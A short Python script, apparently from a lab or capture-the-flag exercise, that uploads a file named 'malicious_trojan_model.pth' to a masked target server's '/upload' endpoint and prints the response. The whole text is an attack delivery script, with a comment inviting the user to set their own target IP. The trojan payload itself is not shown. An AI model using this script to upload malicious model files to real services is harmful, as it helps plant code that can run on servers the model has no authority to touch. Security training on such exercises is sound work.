import requests

url = "http://XX.XX.XXX.XX:5555/upload"  # Update with your target IP if needed
files = {"model": open("malicious_trojan_model.pth", "rb")}
response = requests.post(url, files=files)

print("Status:", response.status_code)
print("Headers:", response.headers)
print("Full Body Text:", response.text)
